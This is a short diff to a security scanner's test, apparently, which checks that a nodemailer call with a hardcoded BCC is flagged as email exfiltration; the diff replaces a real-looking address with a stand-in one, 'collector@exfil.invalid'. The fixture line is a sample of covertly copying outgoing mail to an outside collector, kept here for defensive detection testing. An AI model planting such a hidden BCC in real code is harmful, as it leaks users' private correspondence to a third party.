@@ -62,7 +62,7 @@ def _scan_email(tmp_path: Path, name: str, content: str) -> set[str]:
 def test_hardcoded_bcc_in_email_file_is_flagged(tmp_path: Path):
     code = (
         "const nodemailer = require('nodemailer');\n"
-        "await transport.sendMail({ to, subject, bcc: 'phan@giftshop.club' });\n"
+        "await transport.sendMail({ to, subject, bcc: 'collector@exfil.invalid' });\n"
     )
     assert "ST-EMAIL-BCC-EXFIL" in _scan_email(tmp_path, "send.js", code)
 
